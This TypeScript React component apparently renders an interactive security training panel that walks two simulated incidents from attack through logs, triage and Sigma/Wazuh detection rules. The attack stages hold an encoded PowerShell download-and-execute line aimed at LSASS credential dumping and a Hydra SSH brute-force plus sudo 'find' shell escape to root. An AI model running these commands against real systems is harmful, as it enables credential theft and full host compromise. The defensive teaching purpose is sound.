"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import SectionHeading from "./SectionHeading";
import Reveal from "./Reveal";
import {
  ShieldAlert,
  Terminal,
  FileCode2,
  CheckCircle2,
  AlertTriangle,
  Play,
  RotateCcw,
  Copy,
  Check,
  Layers,
  ChevronRight,
  Flame,
  Radio,
  ExternalLink,
  Eye,
  SlidersHorizontal,
  HelpCircle,
  X,
  BookOpen,
  Sparkles,
  ArrowRight,
} from "lucide-react";

type Stage = 1 | 2 | 3 | 4;
type ScenarioKey = "powershell" | "ssh";

interface ScenarioData {
  id: string;
  name: string;
  category: string;
  mitre: string;
  mitreId: string;
  target: string;
  attacker: string;
  severity: "CRITICAL" | "HIGH";
  severityScore: string;
  stages: {
    attack: {
      tool: string;
      command: string;
      decoded?: string;
      description: string;
      tactics: string[];
      impact: string;
    };
    logs: {
      source: string;
      eventId: string;
      description: string;
      rawJson: Record<string, unknown>;
    };
    triage: {
      ticketId: string;
      title: string;
      sourceIp: string;
      destinationIp: string;
      indicators: { label: string; value: string; risk: "high" | "critical" | "medium" }[];
      blastRadius: string;
      investigationNotes: string[];
    };
    defense: {
      sigmaYaml: string;
      wazuhXml: string;
      containment: string[];
      hardeningTips: string[];
    };
  };
}

const scenarios: Record<ScenarioKey, ScenarioData> = {
  powershell: {
    id: "SCN-001",
    name: "Encoded PowerShell & LSASS Dump",
    category: "Living-off-the-Land / Credential Theft",
    mitre: "Command and Scripting Interpreter: PowerShell",
    mitreId: "T1059.001 / T1003.001",
    target: "FIN-WORKSTATION-09 (Windows 11 · 10.0.10.42)",
    attacker: "192.168.1.185 (External Pivot Node)",
    severity: "CRITICAL",
    severityScore: "9.4 / 10",
    stages: {
      attack: {
        tool: "PowerShell CLI + In-Memory Loader",
        command:
          "powershell.exe -NoP -NonI -W Hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADgANQA6ADgwADAAMAAvAHAAcgBvAGQAdQBtAHAAZQByAC4AcABzADEAJwApAA==",
        decoded:
          "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.185:8000/procdumper.ps1'); Invoke-ProcDump -Process lsass -Output C:\\Windows\\Temp\\debug.dmp",
        description:
          "Adversary executes an obfuscated, hidden Base64 PowerShell one-liner to download an in-memory reflective dumper, bypassing on-disk AV inspection to target LSASS credentials.",
        tactics: ["T1059.001 (PowerShell)", "T1027 (Obfuscation)", "T1003.001 (LSASS Memory)"],
        impact: "Exposes enterprise domain admin hashes stored in memory, enabling lateral movement.",
      },
      logs: {
        source: "Microsoft-Windows-Sysmon/Operational",
        eventId: "Event ID 1 & 10",
        description:
          "Sysmon process creation telemetry records parent-child relationship and base64 command line, followed by Event ID 10 handle acquisition with PROCESS_VM_READ permissions on lsass.exe.",
        rawJson: {
          EventID: 1,
          TimeCreated: "2026-11-08T14:22:18.412Z",
          Computer: "FIN-WS-09.corp.local",
          ParentImage: "C:\\Windows\\explorer.exe",
          Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          CommandLine: "powershell.exe -NoP -NonI -W Hidden -encodedcommand SQBFAFgA...",
          User: "CORP\\jdoe",
          ProcessId: 7844,
          ParentProcessId: 4120,
          Hashes: "SHA256=DE96A68E78D63A64879F496B1C5DE92688463FFEF77A91F46A9CE658245D85DC",
          TargetProcess: "C:\\Windows\\System32\\lsass.exe",
          GrantedAccess: "0x1010 (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFO)",
        },
      },
      triage: {
        ticketId: "INC-2026-8821",
        title: "CRITICAL: Encoded PowerShell Process Access to LSASS on FIN-WS-09",
        sourceIp: "192.168.1.185:8000",
        destinationIp: "10.0.10.42:52410",
        indicators: [
          { label: "Execution Style", value: "Hidden (-w hidden -noni)", risk: "critical" },
          { label: "Target Process", value: "lsass.exe (PID: 672)", risk: "critical" },
          { label: "Staged File", value: "C:\\Windows\\Temp\\debug.dmp", risk: "high" },
          { label: "C2 Host", value: "192.168.1.185 (Flagged IP)", risk: "high" },
        ],
        blastRadius: "Endpoint isolated before domain replication; user session flagged.",
        investigationNotes: [
          "Verified parent process explorer.exe spawned unapproved CLI session at 14:22 UTC.",
          "Decoded Base64 payload revealed direct URI fetch to external port 8000.",
          "ProcDump routine attempted reading LSASS memory space; confirmed memory artifact in temp directory.",
          "Zero signs of secondary beaconing; contained within single workstation.",
        ],
      },
      defense: {
        sigmaYaml: `title: Suspicious Encoded PowerShell Access to LSASS
id: a4f8e132-b7e9-4e89-b1d7-f41e54c7d001
status: production
description: Detects encoded PowerShell downloading remote script and targeting LSASS memory space.
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\\powershell.exe'
  selection_flags:
    CommandLine|contains:
      - '-enc'
      - '-encodedcommand'
      - '-w hidden'
  condition: selection_img and selection_flags
falsepositives:
  - Rare legacy IT administrative maintenance scripts (whitelist by Service Account)
level: critical
tags:
  - attack.execution
  - attack.t1059.001
  - attack.credential_access
  - attack.t1003.001`,
        wazuhXml: `<rule id="100320" level="12">
  <if_group>sysmon_process_create</if_group>
  <match>powershell.exe</match>
  <regex>-enc|-encodedcommand|-w\\s+hidden</regex>
  <description>Suspicious Encoded PowerShell execution detected on $(win.system.computer)</description>
  <mitre>
    <id>T1059.001</id>
    <id>T1003.001</id>
  </mitre>
</rule>`,
        containment: [
          "Host Quarantine: Enforce endpoint network isolation via EDR API (retain SOC telemetry channel only).",
          "Process Kill: Force-terminate PID 7844 and securely shred C:\\Windows\\Temp\\debug.dmp.",
          "Credential Revocation: Reset Active Directory password and purge Kerberos TGT tickets for CORP\\jdoe.",
          "IOC Ingestion: Blacklist 192.168.1.185 on perimeter firewalls and proxy egress filters.",
        ],
        hardeningTips: [
          "Enforce PowerShell Constrained Language Mode (CLM) across non-admin workstations.",
          "Activate PowerShell Script Block Logging (Event ID 4104) and Transcription via GPO.",
          "Enable Windows Defender Credential Guard (LSA Protection) to prevent unprivileged memory access to LSASS.",
          "Restrict standard user execution in C:\\Windows\\Temp via Software Restriction Policies (WDAC/AppLocker).",
        ],
      },
    },
  },
  ssh: {
    id: "SCN-002",
    name: "SSH Brute-Force to Root Privilege Escalation",
    category: "Initial Access & Privilege Abuse",
    mitre: "Password Guessing & Sudo GTFOBins Escape",
    mitreId: "T1110.001 / T1548.003",
    target: "PROD-SRV-WEB01 (Ubuntu 22.04 LTS · 10.0.10.45)",
    attacker: "203.0.113.88 (External Threat Actor)",
    severity: "HIGH",
    severityScore: "8.8 / 10",
    stages: {
      attack: {
        tool: "Hydra / Medusa + GTFOBins Sudo Exploit",
        command:
          "hydra -l developer -P /usr/share/wordlists/rockyou.txt ssh://10.0.10.45 -t 16\nssh developer@10.0.10.45\n[developer@PROD-SRV-WEB01 ~]$ sudo /usr/bin/find . -exec /bin/sh \\; -quit\n# whoami\nroot",
        description:
          "Threat actor executes rapid dictionary attack on SSH port 22. After finding valid credentials for 'developer', the actor abuses a misconfigured NOPASSWD sudo rule on /usr/bin/find to spawn an elevated root shell.",
        tactics: ["T1110.001 (SSH Brute Force)", "T1078 (Valid Accounts)", "T1548.003 (Sudo Abuse)"],
        impact: "Complete root compromise of production web server hosting internal databases.",
      },
      logs: {
        source: "/var/log/auth.log & Auditd",
        eventId: "PAM_AUTH & AUDIT_EXECVE",
        description:
          "Linux auth.log records a rapid cascade of failed password attempts from a single IP, followed by accepted credentials and immediate sudo execution of find spawning /bin/sh.",
        rawJson: {
          timestamp: "2026-11-08T14:24:02.114Z",
          hostname: "PROD-SRV-WEB01",
          program: "sshd",
          pid: 28419,
          failed_attempts: 14,
          source_ip: "203.0.113.88",
          user: "developer",
          auth_result: "Accepted password after 14 failed attempts",
          escalation: {
            program: "sudo",
            user: "developer",
            target_user: "root",
            command: "/usr/bin/find . -exec /bin/sh ; -quit",
          },
        },
      },
      triage: {
        ticketId: "INC-2026-8822",
        title: "HIGH: SSH Brute-Force Succeeded Followed by Sudo Shell Spawn on PROD-SRV-WEB01",
        sourceIp: "203.0.113.88:55102",
        destinationIp: "10.0.10.45:22",
        indicators: [
          { label: "Failed Auth Rate", value: "14 failures / 40s", risk: "high" },
          { label: "Target Account", value: "developer", risk: "medium" },
          { label: "Elevated Command", value: "find -exec /bin/sh", risk: "critical" },
          { label: "Resulting UID", value: "0 (root)", risk: "critical" },
        ],
        blastRadius: "Host compromised; lateral movement to database network intercepted.",
        investigationNotes: [
          "Correlated Wazuh rule 5710 (failed logins) triggering in high frequency from 203.0.113.88.",
          "Immediate success logged at 14:24:45 UTC on pts/2.",
          "Auditd detected execution of /bin/sh as child of /usr/bin/find with UID 0 within 60s of login.",
          "Attacker attempted viewing /etc/shadow before session termination.",
        ],
      },
      defense: {
        sigmaYaml: `title: Sudo Execution of Binaries Known for Shell Escape
id: c8b1f2e4-92d1-4f10-b98a-2d3e4f5a6b7c
status: production
description: Detects GTFOBins execution where sudo is misused to spawn interactive shells.
logsource:
  product: linux
  service: sudo
detection:
  selection:
    COMMAND|contains:
      - '/find '
      - '/vim '
      - '/awk '
    COMMAND|contains|all:
      - '-exec'
      - '/bin/sh'
  condition: selection
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1548.003`,
        wazuhXml: `<rule id="100250" level="10" frequency="8" timeframe="60">
  <if_matched_sid>5710</if_matched_sid>
  <same_source_ip />
  <description>Multiple SSH failed logins from $(srcip) — Brute Force in progress</description>
  <mitre>
    <id>T1110.001</id>
  </mitre>
</rule>
<rule id="100251" level="13">
  <if_sid>100250</if_sid>
  <if_matched_sid>5715</if_matched_sid>
  <same_source_ip />
  <description>CRITICAL: Successful SSH login after brute-force attack from $(srcip)</description>
</rule>`,
        containment: [
          "Session Termination: Kill active pseudo-terminal pts/2 (pkill -9 -t pts/2).",
          "Firewall Drop: Immediately drop all ingress from 203.0.113.88 via iptables / ufw.",
          "Account Lock: Lock developer credentials (passwd -l developer) until incident debrief.",
          "Audit Logs: Snapshot /var/log/audit/audit.log to forensic share.",
        ],
        hardeningTips: [
          "Disable password-based SSH authentication; require Ed25519 public keys only.",
          "Install and configure Fail2ban with 3-strike permanent ban threshold on port 22.",
          "Audit /etc/sudoers with tight principle of least privilege; remove NOPASSWD for GTFOBins executables.",
          "Deploy multi-factor authentication (MFA / Duo PAM module) for all shell access.",
        ],
      },
    },
  },
};

export default function ThreatLab() {
  const [selectedScenario, setSelectedScenario] = useState<ScenarioKey>("powershell");
  const [activeStage, setActiveStage] = useState<Stage>(1);
  const [is3DView, setIs3DView] = useState<boolean>(true);
  const [isSimulating, setIsSimulating] = useState<boolean>(false);
  const [copiedTab, setCopiedTab] = useState<string | null>(null);
  const [defenseTab, setDefenseTab] = useState<"sigma" | "wazuh" | "playbook">("sigma");
  const [showUnderstandModal, setShowUnderstandModal] = useState<boolean>(false);

  const current = scenarios[selectedScenario];

  // Close modal on Escape key & freeze body scroll
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") setShowUnderstandModal(false);
    };
    if (showUnderstandModal) {
      window.addEventListener("keydown", handleKeyDown);
      document.body.style.overflow = "hidden";
    }
    return () => {
      window.removeEventListener("keydown", handleKeyDown);
      document.body.style.overflow = "unset";
    };
  }, [showUnderstandModal]);

  // Auto-play simulation walkthrough
  useEffect(() => {
    if (!isSimulating) return;
    const timer = setTimeout(() => {
      if (activeStage < 4) {
        setActiveStage((prev) => (prev + 1) as Stage);
      } else {
        setIsSimulating(false);
      }
    }, 3200);
    return () => clearTimeout(timer);
  }, [isSimulating, activeStage]);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedTab(id);
    setTimeout(() => setCopiedTab(null), 2000);
  };

  const stageTabs = [
    { num: 1, label: "01. ATTACK", subtitle: "Adversary Payload", icon: Terminal, color: "text-red border-red/40" },
    { num: 2, label: "02. TELEMETRY", subtitle: "Raw Sysmon / Logs", icon: Radio, color: "text-amber border-amber/40" },
    { num: 3, label: "03. SOC TRIAGE", subtitle: "Alert & Blast Radius", icon: ShieldAlert, color: "text-blue border-blue/40" },
    { num: 4, label: "04. DEFENSE BLUEPRINT", subtitle: "Rules & Hardening", icon: CheckCircle2, color: "text-accent border-accent/40" },
  ];

  return (
    <section id="threat-lab" className="mx-auto max-w-6xl px-4 sm:px-6 py-16 sm:py-24 scroll-mt-20">
      <SectionHeading
        eyebrow="~/threat-lab"
        title="Incident Simulation Engine"
        description="Interactive 4-stage pipeline simulating genuine adversary execution, telemetry capture, and defensive hardening."
      />

      {/* Top Controls: Scenario Switcher + 3D View Toggle + Auto Simulation */}
      <div className="flex flex-wrap items-center justify-between gap-4 mb-8">
        {/* Scenario Selection Pills */}
        <div className="flex items-center gap-2 p-1 rounded-md bg-surface border border-line">
          <button
            type="button"
            onClick={() => {
              setSelectedScenario("powershell");
              setActiveStage(1);
            }}
            className={`font-mono text-xs px-3 py-1.5 rounded-sm transition-all flex items-center gap-2 ${
              selectedScenario === "powershell"
                ? "bg-accent text-[#06120c] font-bold shadow-sm"
                : "text-muted hover:text-text"
            }`}
          >
            <Flame size={13} />
            <span>01: Encoded PowerShell (T1059)</span>
          </button>
          <button
            type="button"
            onClick={() => {
              setSelectedScenario("ssh");
              setActiveStage(1);
            }}
            className={`font-mono text-xs px-3 py-1.5 rounded-sm transition-all flex items-center gap-2 ${
              selectedScenario === "ssh"
                ? "bg-accent text-[#06120c] font-bold shadow-sm"
                : "text-muted hover:text-text"
            }`}
          >
            <ShieldAlert size={13} />
            <span>02: SSH Brute-Force (T1110)</span>
          </button>
        </div>

        {/* View Mode, Guide & Simulation Triggers */}
        <div className="flex flex-wrap items-center gap-2.5">
          <button
            type="button"
            onClick={() => setShowUnderstandModal(true)}
            className="font-mono text-xs px-3 py-1.5 rounded-sm border border-accent/40 bg-accent/10 text-accent hover:bg-accent/20 font-semibold transition-all flex items-center gap-1.5 shadow-sm cursor-pointer"
            title="Read detailed guide on how Threat Lab works"
          >
            <HelpCircle size={13} />
            <span>Understand Threat Lab</span>
          </button>

          <button
            type="button"
            onClick={() => setIs3DView(!is3DView)}
            className={`font-mono text-xs px-3 py-1.5 rounded-sm border transition-all flex items-center gap-1.5 cursor-pointer ${
              is3DView
                ? "bg-accent/15 border-accent text-accent font-semibold shadow-[0_0_12px_rgba(57,255,140,0.2)]"
                : "border-line text-muted hover:text-text"
            }`}
            title="Toggle 3D Perspective Isometric Depth"
          >
            <Layers size={13} />
            <span>3D DEPTH: {is3DView ? "ON" : "OFF"}</span>
          </button>

          <button
            type="button"
            onClick={() => {
              if (isSimulating) {
                setIsSimulating(false);
              } else {
                setActiveStage(1);
                setIsSimulating(true);
              }
            }}
            className="font-mono text-xs px-3.5 py-1.5 rounded-sm bg-accent/20 border border-accent text-accent hover:bg-accent/30 font-semibold transition-all flex items-center gap-1.5 cursor-pointer"
          >
            {isSimulating ? (
              <>
                <RotateCcw size={13} className="animate-spin" />
                <span>Simulating...</span>
              </>
            ) : (
              <>
                <Play size={13} />
                <span>Auto-Run Incident</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* 4-Stage Interactive Pipeline Header */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-2.5 sm:gap-3 mb-8">
        {stageTabs.map((tab) => {
          const Icon = tab.icon;
          const isActive = activeStage === tab.num;
          return (
            <button
              key={tab.num}
              type="button"
              onClick={() => {
                setActiveStage(tab.num as Stage);
                setIsSimulating(false);
              }}
              className={`panel text-left p-3.5 sm:p-4 rounded-md transition-all relative overflow-hidden group cursor-pointer border ${
                isActive
                  ? "border-accent shadow-[0_0_20px_rgba(57,255,140,0.25)] bg-surface-light"
                  : "border-line hover:border-line/90 opacity-75 hover:opacity-100"
              }`}
            >
              {isActive && (
                <div className="h-[2px] w-full bg-accent absolute top-0 left-0 animate-pulse" />
              )}
              <div className="flex items-center justify-between mb-1.5">
                <span
                  className={`font-mono text-[10px] font-bold tracking-wider ${
                    isActive ? "text-accent" : "text-dim"
                  }`}
                >
                  {tab.label}
                </span>
                <Icon
                  size={14}
                  className={isActive ? "text-accent" : "text-dim group-hover:text-muted"}
                />
              </div>
              <p className="font-mono text-xs font-semibold text-text truncate">
                {tab.subtitle}
              </p>
            </button>
          );
        })}
      </div>

      {/* Main 3D Perspective Workspace Container */}
      <div
        className={`transition-all duration-500 ease-out ${
          is3DView
            ? "transform-gpu md:[perspective:1400px] md:[transform:rotateX(2deg)]"
            : ""
        }`}
      >
        <div className="panel rounded-md overflow-hidden border border-accent/40 shadow-[0_12px_40px_rgba(0,0,0,0.35)] relative bg-panel">
          {/* Top Console Telemetry Bar */}
          <div className="panel-header px-4 sm:px-6 py-3 flex flex-wrap items-center justify-between gap-3 bg-surface border-b border-line">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-red animate-pulse" />
              <span className="font-mono text-xs font-bold text-text">
                {current.id} // {current.name}
              </span>
              <span className="hidden sm:inline-block font-mono text-[10px] px-2 py-0.5 rounded-sm border border-red/40 bg-red/10 text-red font-semibold">
                SEV: {current.severity} ({current.severityScore})
              </span>
            </div>

            <div className="flex items-center gap-3 font-mono text-[11px] text-muted">
              <span>TARGET: <span className="text-text font-semibold">{current.target.split(" ")[0]}</span></span>
              <span className="text-dim">|</span>
              <span className="text-accent font-semibold">{current.mitreId}</span>
            </div>
          </div>

          {/* Interactive Screen Content for Active Stage */}
          <div className="p-5 sm:p-7 min-h-[440px]">
            <AnimatePresence mode="wait">
              {/* STAGE 1: ATTACK EXECUTION */}
              {activeStage === 1 && (
                <motion.div
                  key="stage-1"
                  initial={{ opacity: 0, y: 12 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.3 }}
                  className="space-y-6"
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-line pb-3">
                    <div>
                      <span className="font-mono text-[10px] text-red font-bold uppercase tracking-wider block">
                        STAGE 01 // RED TEAM EXECUTION
                      </span>
                      <h3 className="font-mono text-base sm:text-lg font-bold text-text mt-0.5">
                        Adversary Payload & Command Invocation
                      </h3>
                    </div>
                    <span className="font-mono text-xs px-2.5 py-1 rounded-sm border border-red/40 bg-red/10 text-red font-semibold">
                      ATTACKER: {current.attacker}
                    </span>
                  </div>

                  <p className="font-mono text-xs sm:text-sm text-muted leading-relaxed">
                    {current.stages.attack.description}
                  </p>

                  {/* Terminal Execution Box */}
                  <div className="rounded-sm bg-[#060a08] border border-red/40 p-4 font-mono text-xs text-text overflow-x-auto shadow-inner">
                    <div className="flex items-center gap-2 mb-3 text-dim border-b border-white/5 pb-2">
                      <span className="text-red font-bold">attacker@kali</span>
                      <span>:</span>
                      <span className="text-accent">~#</span>
                      <span className="text-[11px] text-muted">execute payload</span>
                    </div>
                    <pre className="text-red/90 whitespace-pre-wrap leading-relaxed select-all">
                      {current.stages.attack.command}
                    </pre>

                    {current.stages.attack.decoded && (
                      <div className="mt-4 pt-3 border-t border-red/20">
                        <span className="text-accent text-[11px] block font-bold mb-1">
                          [DECODED RUNTIME INSTRUCTION]:
                        </span>
                        <code className="text-accent/90 text-[11px] block bg-accent/5 p-2 rounded-sm border border-accent/20">
                          {current.stages.attack.decoded}
                        </code>
                      </div>
                    )}
                  </div>

                  {/* TTPs & Tactics Breakdown */}
                  <div className="grid sm:grid-cols-2 gap-4 pt-2">
                    <div className="p-3.5 rounded-sm bg-surface-light border border-line">
                      <span className="font-mono text-[10px] text-dim uppercase tracking-wider block mb-1">
                        MITRE ATT&CK TECHNIQUES
                      </span>
                      <div className="flex flex-wrap gap-1.5 mt-1.5">
                        {current.stages.attack.tactics.map((t) => (
                          <span
                            key={t}
                            className="font-mono text-[11px] px-2 py-0.5 rounded-sm bg-red/10 border border-red/30 text-red font-semibold"
                          >
                            {t}
                          </span>
                        ))}
                      </div>
                    </div>

                    <div className="p-3.5 rounded-sm bg-surface-light border border-line">
                      <span className="font-mono text-[10px] text-dim uppercase tracking-wider block mb-1">
                        IMPACT ASSESSMENT
                      </span>
                      <p className="font-mono text-xs text-muted leading-relaxed">
                        {current.stages.attack.impact}
                      </p>
                    </div>
                  </div>
                </motion.div>
              )}

              {/* STAGE 2: TELEMETRY & RAW LOGS */}
              {activeStage === 2 && (
                <motion.div
                  key="stage-2"
                  initial={{ opacity: 0, y: 12 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.3 }}
                  className="space-y-6"
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-line pb-3">
                    <div>
                      <span className="font-mono text-[10px] text-amber font-bold uppercase tracking-wider block">
                        STAGE 02 // SENSOR TELEMETRY CAPTURE
                      </span>
                      <h3 className="font-mono text-base sm:text-lg font-bold text-text mt-0.5">
                        Raw Endpoint & Audit Log Evidence
                      </h3>
                    </div>
                    <span className="font-mono text-xs px-2.5 py-1 rounded-sm border border-amber/40 bg-amber/10 text-amber font-semibold">
                      SOURCE: {current.stages.logs.source}
                    </span>
                  </div>

                  <p className="font-mono text-xs sm:text-sm text-muted leading-relaxed">
                    {current.stages.logs.description}
                  </p>

                  {/* Raw JSON Structured Log Viewer */}
                  <div className="rounded-sm bg-[#060a08] border border-amber/40 p-4 font-mono text-xs text-text overflow-x-auto shadow-inner">
                    <div className="flex items-center justify-between text-dim border-b border-white/5 pb-2 mb-3">
                      <div className="flex items-center gap-2">
                        <Radio size={13} className="text-amber" />
                        <span className="text-amber font-bold">{current.stages.logs.eventId}</span>
                        <span>telemetry_stream.json</span>
                      </div>
                      <button
                        type="button"
                        onClick={() =>
                          copyToClipboard(
                            JSON.stringify(current.stages.logs.rawJson, null, 2),
                            "logs"
                          )
                        }
                        className="inline-flex items-center gap-1 text-[11px] text-muted hover:text-amber transition-colors"
                      >
                        {copiedTab === "logs" ? (
                          <>
                            <Check size={12} className="text-accent" />
                            <span className="text-accent">Copied</span>
                          </>
                        ) : (
                          <>
                            <Copy size={12} />
                            <span>Copy Log</span>
                          </>
                        )}
                      </button>
                    </div>
                    <pre className="text-amber/90 leading-relaxed overflow-x-auto">
                      {JSON.stringify(current.stages.logs.rawJson, null, 2)}
                    </pre>
                  </div>
                </motion.div>
              )}

              {/* STAGE 3: SOC TRIAGE & INVESTIGATION */}
              {activeStage === 3 && (
                <motion.div
                  key="stage-3"
                  initial={{ opacity: 0, y: 12 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.3 }}
                  className="space-y-6"
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-line pb-3">
                    <div>
                      <span className="font-mono text-[10px] text-blue font-bold uppercase tracking-wider block">
                        STAGE 03 // SOC INVESTIGATION & CORRELATION
                      </span>
                      <h3 className="font-mono text-base sm:text-lg font-bold text-text mt-0.5">
                        {current.stages.triage.title}
                      </h3>
                    </div>
                    <span className="font-mono text-xs px-2.5 py-1 rounded-sm border border-blue/40 bg-blue/10 text-blue font-semibold">
                      TICKET: {current.stages.triage.ticketId}
                    </span>
                  </div>

                  {/* Indicators Grid */}
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                    {current.stages.triage.indicators.map((ind) => (
                      <div
                        key={ind.label}
                        className="p-3 rounded-sm bg-surface-light border border-line"
                      >
                        <span className="font-mono text-[10px] text-dim block uppercase">
                          {ind.label}
                        </span>
                        <span className="font-mono text-xs font-bold text-text mt-1 block truncate">
                          {ind.value}
                        </span>
                        <span
                          className={`inline-block font-mono text-[9px] uppercase px-1.5 py-0.2 rounded mt-1.5 font-bold ${
                            ind.risk === "critical"
                              ? "bg-red/10 text-red border border-red/30"
                              : ind.risk === "high"
                              ? "bg-amber/10 text-amber border border-amber/30"
                              : "bg-blue/10 text-blue border border-blue/30"
                          }`}
                        >
                          {ind.risk}
                        </span>
                      </div>
                    ))}
                  </div>

                  {/* Analyst Investigation Walkthrough */}
                  <div className="p-4 rounded-sm bg-surface-light border border-line">
                    <span className="font-mono text-xs font-bold text-text block mb-3 flex items-center gap-1.5">
                      <ShieldAlert size={14} className="text-blue" />
                      <span>ANALYST TRIAGE FINDINGS:</span>
                    </span>
                    <ul className="space-y-2 font-mono text-xs text-muted">
                      {current.stages.triage.investigationNotes.map((note, i) => (
                        <li key={i} className="flex items-start gap-2">
                          <span className="text-blue font-bold">[{i + 1}]</span>
                          <span className="leading-relaxed">{note}</span>
                        </li>
                      ))}
                    </ul>
                  </div>

                  {/* Blast Radius Box */}
                  <div className="p-3.5 rounded-sm bg-blue/5 border border-blue/30 flex items-center justify-between font-mono text-xs">
                    <span className="text-muted">BLAST RADIUS:</span>
                    <span className="text-blue font-semibold">{current.stages.triage.blastRadius}</span>
                  </div>
                </motion.div>
              )}

              {/* STAGE 4: DEFENSE RULES & PLAYBOOK */}
              {activeStage === 4 && (
                <motion.div
                  key="stage-4"
                  initial={{ opacity: 0, y: 12 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.3 }}
                  className="space-y-6"
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 border-b border-line pb-3">
                    <div>
                      <span className="font-mono text-[10px] text-accent font-bold uppercase tracking-wider block">
                        STAGE 04 // DEFENSIVE PLAYBOOK & DETECTION RULES
                      </span>
                      <h3 className="font-mono text-base sm:text-lg font-bold text-text mt-0.5">
                        Production Detections & Hardening Directives
                      </h3>
                    </div>

                    {/* Sub-tabs: Sigma vs Wazuh vs Containment */}
                    <div className="flex items-center gap-2">
                      <button
                        type="button"
                        onClick={() => setDefenseTab("sigma")}
                        className={`font-mono text-xs px-2.5 py-1 rounded-sm border transition-all ${
                          defenseTab === "sigma"
                            ? "bg-accent/20 border-accent text-accent font-bold"
                            : "border-line text-muted hover:text-text"
                        }`}
                      >
                        Sigma Rule (YAML)
                      </button>
                      <button
                        type="button"
                        onClick={() => setDefenseTab("wazuh")}
                        className={`font-mono text-xs px-2.5 py-1 rounded-sm border transition-all ${
                          defenseTab === "wazuh"
                            ? "bg-accent/20 border-accent text-accent font-bold"
                            : "border-line text-muted hover:text-text"
                        }`}
                      >
                        Wazuh (XML)
                      </button>
                      <button
                        type="button"
                        onClick={() => setDefenseTab("playbook")}
                        className={`font-mono text-xs px-2.5 py-1 rounded-sm border transition-all ${
                          defenseTab === "playbook"
                            ? "bg-accent/20 border-accent text-accent font-bold"
                            : "border-line text-muted hover:text-text"
                        }`}
                      >
                        Playbook & Hardening
                      </button>
                    </div>
                  </div>

                  {/* Sigma Rule Code Block */}
                  {defenseTab === "sigma" && (
                    <div className="rounded-sm bg-[#060a08] border border-accent/40 p-4 font-mono text-xs text-text overflow-x-auto shadow-inner relative">
                      <div className="flex items-center justify-between text-dim border-b border-white/5 pb-2 mb-3">
                        <span className="text-accent font-bold">detection_rule.yml — Sigma Standard</span>
                        <button
                          type="button"
                          onClick={() => copyToClipboard(current.stages.defense.sigmaYaml, "sigma")}
                          className="inline-flex items-center gap-1 text-[11px] text-muted hover:text-accent transition-colors"
                        >
                          {copiedTab === "sigma" ? (
                            <>
                              <Check size={12} className="text-accent" />
                              <span className="text-accent">Copied</span>
                            </>
                          ) : (
                            <>
                              <Copy size={12} />
                              <span>Copy YAML</span>
                            </>
                          )}
                        </button>
                      </div>
                      <pre className="text-accent/90 leading-relaxed overflow-x-auto">
                        {current.stages.defense.sigmaYaml}
                      </pre>
                    </div>
                  )}

                  {/* Wazuh Rule Code Block */}
                  {defenseTab === "wazuh" && (
                    <div className="rounded-sm bg-[#060a08] border border-accent/40 p-4 font-mono text-xs text-text overflow-x-auto shadow-inner relative">
                      <div className="flex items-center justify-between text-dim border-b border-white/5 pb-2 mb-3">
                        <span className="text-accent font-bold">local_rules.xml — Wazuh SIEM</span>
                        <button
                          type="button"
                          onClick={() => copyToClipboard(current.stages.defense.wazuhXml, "wazuh")}
                          className="inline-flex items-center gap-1 text-[11px] text-muted hover:text-accent transition-colors"
                        >
                          {copiedTab === "wazuh" ? (
                            <>
                              <Check size={12} className="text-accent" />
                              <span className="text-accent">Copied</span>
                            </>
                          ) : (
                            <>
                              <Copy size={12} />
                              <span>Copy XML</span>
                            </>
                          )}
                        </button>
                      </div>
                      <pre className="text-accent/90 leading-relaxed overflow-x-auto">
                        {current.stages.defense.wazuhXml}
                      </pre>
                    </div>
                  )}

                  {/* Containment & Hardening Playbook */}
                  {defenseTab === "playbook" && (
                    <div className="grid sm:grid-cols-2 gap-4">
                      {/* Containment Actions */}
                      <div className="p-4 rounded-sm bg-surface-light border border-line flex flex-col justify-between">
                        <div>
                          <span className="font-mono text-xs font-bold text-amber block mb-3 flex items-center gap-1.5">
                            <AlertTriangle size={14} />
                            <span>CONTAINMENT & RESPONSE:</span>
                          </span>
                          <ul className="space-y-2.5 font-mono text-xs text-muted">
                            {current.stages.defense.containment.map((action, i) => (
                              <li key={i} className="flex items-start gap-2">
                                <span className="text-amber font-bold">✓</span>
                                <span className="leading-relaxed">{action}</span>
                              </li>
                            ))}
                          </ul>
                        </div>
                      </div>

                      {/* Enterprise Hardening Tips */}
                      <div className="p-4 rounded-sm bg-surface-light border border-line flex flex-col justify-between">
                        <div>
                          <span className="font-mono text-xs font-bold text-accent block mb-3 flex items-center gap-1.5">
                            <CheckCircle2 size={14} />
                            <span>ENTERPRISE HARDENING TIPS:</span>
                          </span>
                          <ul className="space-y-2.5 font-mono text-xs text-muted">
